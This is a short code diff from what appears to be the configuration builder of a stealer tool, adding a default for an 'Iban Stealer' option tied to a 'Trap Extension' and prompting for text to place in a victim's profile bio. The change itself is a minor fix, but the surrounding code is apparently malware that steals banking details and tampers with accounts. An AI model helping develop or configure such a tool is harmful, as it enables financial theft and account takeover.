@@ -156,6 +156,8 @@ while True:
     
     if Trap_Extension == True:
         Iban_Stealer = get_boolean_input('Enable Iban Stealer (Trap Extension (Only Py File))  Y/N: ')
+    else:
+        Iban_Stealer = None
 
     if change:
         bio = input(r'''Input the text you want the user to have in his about me (Right-click to paste) or put \n to skip a line -> ''')
